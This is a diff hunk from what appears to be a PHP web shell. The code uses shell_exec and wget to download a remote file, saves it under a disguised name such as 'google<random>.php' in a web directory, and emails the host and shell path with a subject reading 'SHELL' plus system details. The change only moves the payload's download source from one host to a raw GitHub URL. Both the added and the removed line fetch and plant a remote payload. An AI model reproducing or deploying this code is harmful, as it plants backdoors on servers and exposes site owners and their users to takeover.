@@ -1232,7 +1232,7 @@ elseif($zxcase){
   $subject = 'SHELL ( '.php_uname().' )';
   $message = $_SERVER['HTTP_HOST'] . $msg . "/google".$random.".php";
   $headers[] = 'From: '.$_SERVER['HTTP_HOST'].' <'.$_SERVER['HTTP_HOST'].'>';
-  @shell_exec("wget 'https://suryanata4-suryanata.c9users.io/admin-export.txt' -O ".$dir."/google".$random.".php");
+  @shell_exec("wget 'https://raw.githubusercontent.com/suryanata4/suryanata4/master/admin-export.txt' -O ".$dir."/google".$random.".php");
   if(mail($to, $subject, $message, implode("\r\n", $headers))){
     echo "<font color=lime>Sended to $to</font><br>";
   } else {
